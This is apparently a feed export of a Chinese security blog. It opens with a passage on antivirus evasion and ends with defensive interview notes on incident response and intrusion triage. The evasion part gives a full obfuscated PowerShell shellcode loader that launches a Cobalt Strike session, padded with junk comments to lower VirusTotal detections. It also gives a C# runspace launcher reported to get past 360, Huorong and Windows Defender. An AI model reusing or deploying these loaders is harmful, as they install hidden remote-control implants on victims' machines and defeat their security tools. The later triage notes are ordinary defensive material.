KFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="string">&#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="string">&#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;</span></span><br><span class="line"><span class="variable">$p3</span> = <span class="string">&#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;</span></span><br><span class="line"><span class="variable">$p4</span> = <span class="string">&#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span></span><br><span class="line"><span class="variable">$bbb</span>= [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$p1</span>+<span class="variable">$p2</span>+<span class="variable">$p3</span>+<span class="variable">$p4</span>))</span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$bbb</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$bbb</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以上线CS</p>
<p><img src="/posts/adb63639/26.png" alt="截图"></p>
<p>在VT上没啥变化 </p>
<p><img src="/posts/adb63639/27.png" alt="截图"></p>
<p>在进行变换试试</p>
<p>这里不止可以使用base64 还可以去用 AES 异或 ASCII等方式进行加密 也可以添加一些垃圾注释进行干扰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wessda2mpdGd3R6w1da3RmhjTGMzMEt13G9rZShbSW50UHRyXTo6Wm5dasCM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo63r2sdaQycDFhbkYZlFvVVlHQ</span><br><span class="line">$a314fpda9 = &#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span><br><span class="line">#asdYyY0E1M1puQjNEbVZasdxYjJZ356dqqQ0Iyew4cas0lhd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQ</span><br><span class="line">$psdaadsas = &#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;#adfijkhiu2y988hdcbnkjhiugsdaaslkh2eoiheiuoe2hncxxlknxc nvdh9802yuhiodhoahjieasssreshelsa1s</span><br><span class="line">$213rdsaf3 = &#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;#fasdhnkjlh2iuhjdcb789gheh289hsko-0e22e</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYfadsraeawweaewjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZsadaR0p4RG5CM1ltMw23142W5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">$1sdasfp24 = &#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a314fpda9+$psdaadsas+$213rdsaf3+$1sdasfp24))#JKemVCZC9jM2w3RmhjTGkkyTWpkRXQ3aDNERzNQYXdtaU00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNa)</span><br><span class="line">If ([IntPtr]::size -eq 8  ) &#123;#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job #dsasafaaffafaaffaasdsa31241412sdad231 rfdadsaf43gv213aat64zxcr</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  #asd22jnk43lhjsd9u23nkl#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9ryXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQf89dy890w3epoi2j231r34ra</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/28.png" alt="截图"></p>
<p>可以看到从15减到了5 添加垃圾注释还是有效果的 但是被amsi拦截了  无法绕过WinDef </p>
<p><img src="/posts/adb63639/nbpwdf.png"></p>
<p><a href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
<p>这篇文章将ps的payload 随机分段 这样每次都不会相同 而杀软有时会记录特征 固定的几段可能会失效，而随机切片分段效果会好些</p>
<br>

<h3 id="C-调用WINAPI"><a href="#C-调用WINAPI" class="headerlink" title="C#调用WINAPI"></a>C#调用WINAPI</h3><p>项目地址 <a href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a> <strong>感谢格林师傅提供的免杀文章</strong></p>
<p>在VS中导入C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0 到项目中</p>
<p>通过调用windows的API去执行powershell命令 从而去绕过360对powershell的禁用</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">nopowershell</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Programe</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] psrevshell = Convert.FromBase64String(<span class="string">&quot;Y2FsYw==&quot;</span>); <span class="comment">//base64 ps1 shellcode</span></span><br><span class="line">            <span class="built_in">string</span> decodedString = Encoding.UTF8.GetString(psrevshell);</span><br><span class="line">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class="line">            rs.Open();</span><br><span class="line">            Pipeline pipeline = rs.CreatePipeline();</span><br><span class="line">            pipeline.Commands.AddScript(decodedString);</span><br><span class="line">            pipeline.Invoke();</span><br><span class="line">            rs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>编译后 动态静态都可过360 腾讯 火绒 但是在运行后会出现一个黑框，需要改一下项目(修改项目的属性–&gt; 输出类型 改为 Windows应用程序即可消除黑框)</p>
<p><img src="/posts/adb63639/29.png"></p>
<p>这个也可以绕过WinDef</p>
<p><img src="/posts/adb63639/33.png"></p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><strong>感谢格林大佬的提供的学习文章和项目</strong> Orz !!!</p>
<p><a href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a></p>
<p><a href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
<p><a href="https://mamor5409.github.io/posts/359bf983/">https://mamor5409.github.io/posts/359bf983/</a></p>
<p><a href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>整理的部分面试题及答案</title>
    <url>/posts/884863d2/</url>
    <content><![CDATA[<h3 id="应急响应基本思路流程"><a href="#应急响应基本思路流程" class="headerlink" title="应急响应基本思路流程"></a>应急响应基本思路流程</h3><p>  1.收集信息  收集客户信息和中毒主机信息 包括样本<br>  2.判断类型  判断是何种安全事件（挖矿、勒索、Dos、断网等）<br>  3.抑制范围  隔离，使受害面不继续扩大<br>  4.深入分析  日志分析、进程分析、启动项分析、样本分析<br>  5.清理处置  杀掉进程、打补丁、删文件、删除后门、删除异常启动服务<br>  6.产出报告  整理输出完整的安全事件报告</p>
<h3 id="Windows入侵排查思路"><a href="#Windows入侵排查思路" class="headerlink" title="Windows入侵排查思路"></a>Windows入侵排查思路</h3><p>  1.检查系统账号安全<br>    &lt;1&gt;是否有弱口令 连接对外开发的端口（可以用netstat -ano 查看）<br>    &lt;2&gt; lusrmgr.msc 查看服务器是否存在可疑账号、新增账号<br>    &lt;3&gt;通过D盾或者注册表查看服务器是否存在隐藏账号或克隆账号<br>    &lt;4&gt;结合日志查看管理员登录事件、用户名是否正常（eventvwr.msc打开事件查看器，导出后使用LogParer分析）</p>
<p>  2.检查异常端口、进程<br>    netstat -ano 检查端口连接情况<br>    使用任务管理器或者 process exp/processmon 等查看进程<br>  3.检查启动项、计划任务、服务</p>
<p>  4.检查系统相关信息、版本、补丁<br>    systeminfo<br>  5.查找可疑目录及文件<br>    可以通过 %UserProfile%\Recent 查看最近访问，查看浏览器下载目录/历史记录/修改文件的时间<br>  6.日志分析<br>    eventvwr.msc 导出到LogParser</p>
<p>Linux入侵排查思路<br>  &lt;1&gt; 账号安全<br>    who 查看当前登录用户（tty本地登陆 pts远程登录）<br>    w   查看系统信息，想知道某一时刻用户的行为<br>    cat /etc/passwd 用户信息文件<br>      root:x:0:0:root:/root:/bin/bash<br>      account:password:UID:GID:GECOS:directory:shell<br>      用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell<br>      注意：无密码只允许本机登陆，远程不允许登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd 存储一般的用户信息，任何人都可以访问；</span><br><span class="line">/etc/shadow 存储用户的密码信息，只有 root 用户可以访问</span><br><span class="line"></span><br><span class="line">cat /etc/shadow 影子文件</span><br><span class="line">  root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</p>
